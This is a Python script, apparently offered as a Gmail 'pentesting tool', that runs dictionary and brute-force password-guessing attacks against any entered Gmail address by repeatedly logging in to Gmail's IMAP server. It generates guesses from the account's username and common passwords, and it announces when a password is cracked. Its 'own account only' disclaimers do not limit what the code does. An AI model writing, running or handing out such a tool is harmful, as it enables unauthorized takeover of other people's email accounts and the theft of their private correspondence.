#!/usr/bin/env python3
"""
Gmail Password Pentesting Tool
Tests Gmail security by attempting common password attacks
"""

import imaplib
import time
import random
import string

class GmailPasswordPentester:
    def __init__(self):
        self.attack_attempts = 0
        self.successful_attacks = []
        self.failed_attacks = []
        
    def generate_common_passwords(self, email_address):
        """Generate common password variations based on email"""
        passwords = []
        
        # Extract username from email
        username = email_address.split('@')[0]
        
        # Common password patterns
        common_patterns = [
            # Simple variations
            username,
            username + '123',
            username + '1234',
            username + '12345',
            username + '123456',
            username + '2024',
            username + '2025',
            username + 'password',
            username + 'Password',
            username + 'PASSWORD',
            
            # With special characters
            username + '!',
            username + '@',
            username + '#',
            username + '$',
            username + '%',
            username + '!123',
            username + '@123',
            
            # Reversed
            username[::-1],
            username[::-1] + '123',
            
            # Capitalized
            username.capitalize(),
            username.upper(),
            username.lower(),
            
            # With numbers
            username + '1',
            username + '12',
            username + '123',
            username + '1234',
            username + '12345',
            username + '123456',
            username + '1234567',
            username + '12345678',
            
            # Common passwords
            'password',
            'Password',
            'PASSWORD',
            'password123',
            'Password123',
            'PASSWORD123',
            'admin',
            'Admin',
            'ADMIN',
            'admin123',
            'Admin123',
            'ADMIN123',
            '123456',
            '123456789',
            'qwerty',
            'qwerty123',
            'abc123',
            'ABC123',
            'letmein',
            'welcome',
            'Welcome',
            'WELCOME',
            'welcome123',
            'Welcome123',
            'WELCOME123',
        ]
        
        return common_patterns
    
    def test_password(self, email_address, password, delay=1):
        """Test a single password against Gmail IMAP"""
        try:
            print(f"ğŸ” Testing: {password}")
            
            # Connect to Gmail IMAP
            mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
            mail.login(email_address, password)
            
            # If we get here, password worked!
            print(f"âœ… SUCCESS! Password found: {password}")
            mail.close()
            mail.logout()
            return True
            
        except imaplib.IMAP4.error as e:
            if "Authentication failed" in str(e):
                print(f"âŒ Failed: {password}")
                return False
            else:
                print(f"âš ï¸  Error: {e}")
                return False
        except Exception as e:
            print(f"âŒ Connection error: {e}")
            return False
        finally:
            time.sleep(delay)  # Rate limiting
    
    def brute_force_attack(self, email_address, max_attempts=50):
        """Perform brute force attack on Gmail"""
        print("ğŸš€ Gmail Password Brute Force Attack")
        print("=" * 50)
        print(f"ğŸ“§ Target: {email_address}")
        print(f"ğŸ¯ Max attempts: {max_attempts}")
        print("âš ï¸  This is for educational purposes only!")
        print()
        
        # Generate password list
        passwords = self.generate_common_passwords(email_address)
        
        # Add more random passwords
        for i in range(20):
            random_pass = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            passwords.append(random_pass)
        
        # Shuffle for randomness
        random.shuffle(passwords)
        
        # Limit attempts
        passwords = passwords[:max_attempts]
        
        print(f"ğŸ” Testing {len(passwords)} password variations...")
        print()
        
        # Test each password
        for i, password in enumerate(passwords, 1):
            print(f"ğŸ¯ Attempt {i}/{len(passwords)}: ", end="")
            
            if self.test_password(email_address, password):
                self.successful_attacks.append(password)
                print(f"\nğŸ‰ PASSWORD CRACKED: {password}")
                print(f"ğŸ“Š Total attempts: {i}")
                return password
            
            self.attack_attempts += 1
            
            # Rate limiting
            if i % 10 == 0:
                print(f"\nâ¸ï¸  Rate limiting... waiting 5 seconds...")
                time.sleep(5)
        
        print(f"\nâŒ No passwords found after {len(passwords)} attempts")
        return None
    
    def dictionary_attack(self, email_address, wordlist_file=None):
        """Perform dictionary attack using common passwords"""
        print("ğŸ“š Gmail Dictionary Attack")
        print("=" * 50)
        print(f"ğŸ“§ Target: {email_address}")
        print("âš ï¸  Using common password dictionary")
        print()
        
        # Common password dictionary
        common_passwords = [
            'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin', 'letmein', 'welcome', 'monkey',
            '1234567890', 'dragon', 'master', 'hello', 'freedom',
            'whatever', 'qazwsx', 'trustno1', 'dragon', 'password1',
            'welcome123', 'admin123', '12345678', '1234567890',
            'qwerty123', 'abc123456', 'password1', 'welcome1',
            'admin1', '1234567', 'qwerty1', 'abc1234', 'password12',
            'welcome12', 'admin12', '123456789', 'qwerty12', 'abc12345'
        ]
        
        print(f"ğŸ” Testing {len(common_passwords)} dictionary words...")
        print()
        
        for i, password in enumerate(common_passwords, 1):
            print(f"ğŸ¯ Dictionary {i}/{len(common_passwords)}: ", end="")
            
            if self.test_password(email_address, password):
                self.successful_attacks.append(password)
                print(f"\nğŸ‰ DICTIONARY ATTACK SUCCESS: {password}")
                return password
            
            self.attack_attempts += 1
            time.sleep(0.5)  # Rate limiting
        
        print(f"\nâŒ Dictionary attack failed after {len(common_passwords)} attempts")
        return None
    
    def hybrid_attack(self, email_address):
        """Combine multiple attack methods"""
        print("ğŸ”¥ Gmail Hybrid Password Attack")
        print("=" * 50)
        print(f"ğŸ“§ Target: {email_address}")
        print("ğŸ¯ Combining brute force + dictionary + social engineering")
        print()
        
        # Method 1: Dictionary attack
        print("ğŸ“š Phase 1: Dictionary Attack")
        result = self.dictionary_attack(email_address)
        if result:
            return result
        
        # Method 2: Brute force attack
        print("\nğŸ’¥ Phase 2: Brute Force Attack")
        result = self.brute_force_attack(email_address, max_attempts=30)
        if result:
            return result
        
        print("\nâŒ All attack methods failed")
        return None
    
    def generate_security_report(self):
        """Generate security assessment report"""
        print("\nğŸ“Š Gmail Security Assessment Report")
        print("=" * 50)
        print(f"ğŸ¯ Total attack attempts: {self.attack_attempts}")
        print(f"âœ… Successful attacks: {len(self.successful_attacks)}")
        print(f"âŒ Failed attacks: {self.attack_attempts - len(self.successful_attacks)}")
        
        if self.successful_attacks:
            print(f"\nğŸš¨ SECURITY VULNERABILITIES FOUND:")
            for password in self.successful_attacks:
                print(f"   ğŸ”“ Weak password: {password}")
        else:
            print(f"\nâœ… SECURITY ASSESSMENT: No vulnerabilities found!")
            print("   Your Gmail password appears to be secure against common attacks.")
        
        print(f"\nğŸ’¡ SECURITY RECOMMENDATIONS:")
        print("   âœ… Use strong, unique passwords")
        print("   âœ… Enable 2FA (Two-Factor Authentication)")
        print("   âœ… Use App Passwords for IMAP access")
        print("   âœ… Enable Login Alerts")
        print("   âœ… Check Login Activity regularly")
        print("   âœ… Use a password manager")

def main():
    """Main pentesting function"""
    print("ğŸ” Gmail Password Pentesting Tool")
    print("=" * 50)
    print("âš ï¸  This tool tests Gmail security by attempting password attacks")
    print("âš ï¸  Use only on your own Gmail account for security testing")
    print("âš ï¸  This is for educational and security assessment purposes")
    print()
    
    # Get target email
    email_address = input("ğŸ“§ Enter your Gmail address to test: ")
    
    if not email_address or '@gmail.com' not in email_address:
        print("âŒ Valid Gmail address required!")
        return
    
    print(f"\nğŸ¯ Target: {email_address}")
    print("âš ï¸  Starting password attack simulation...")
    print()
    
    # Create pentester
    pentester = GmailPasswordPentester()
    
    try:
        # Perform hybrid attack
        result = pentester.hybrid_attack(email_address)
        
        # Generate security report
        pentester.generate_security_report()
        
    except KeyboardInterrupt:
        print("\nâ¹ï¸  Attack interrupted by user")
    except Exception as e:
        print(f"\nâŒ Error: {e}")
    finally:
        print(f"\nğŸ” Pentesting complete!")

if __name__ == "__main__":
    main()

